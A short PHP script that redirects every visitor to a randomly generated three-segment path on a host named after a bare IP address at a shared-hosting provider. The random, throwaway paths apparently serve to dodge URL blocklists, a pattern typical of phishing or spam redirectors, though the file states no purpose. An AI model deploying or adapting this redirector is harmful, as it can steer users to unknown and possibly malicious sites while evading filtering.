<?php
$baseUrl = 'https://201.225.167.72.host.secureserver.net/';

function generateSegment($length) {
  $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  return substr(str_shuffle(str_repeat($chars, $length)), 0, $length);
}

$urls = [
  $baseUrl . generateSegment(8) . '/' . generateSegment(8) . '/' . generateSegment(8),
  $baseUrl . generateSegment(8) . '/' . generateSegment(8) . '/' . generateSegment(8),
];

$randomUrl = $urls[array_rand($urls)];
header("Location: " . $randomUrl);
exit();
?>
